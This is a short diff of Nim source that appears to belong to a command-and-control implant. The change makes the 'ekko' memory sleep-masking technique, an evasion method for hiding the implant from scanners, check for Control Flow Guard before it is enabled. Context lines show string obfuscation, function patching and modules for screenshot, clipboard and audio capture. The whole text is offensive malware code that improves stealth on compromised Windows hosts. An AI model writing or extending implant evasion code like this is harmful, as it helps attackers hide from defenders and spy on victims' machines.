@@ -1,6 +1,7 @@
 # Internal imports
 import ../config
 import ../common
+import utils/incl/cfg
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
 # Internal imports
 import std/[tables, nativesockets, json]
@@ -350,18 +351,20 @@ proc wrap_patch_func(func_name: string): bool =
 
 proc change_memsleep(technique: string): bool =
     var is_success: bool
-
     if technique == protectString("none"): 
         memsleep_technique = 0
         is_success = true
     elif technique == protectString("ekko"):
-        is_success = true
-        memsleep_technique = 1
+        if isControlFlowGuardEnabled():
+            is_success = false
+        else:
+            is_success = true
+            memsleep_technique = 1
     else:
         is_success = false
     
     var data = {
-        protectString("memsleep_technique"): technique,
+        protectString("technique"): technique,
         protectString("is_success"): $is_success
     }.toOrderedTable()
     
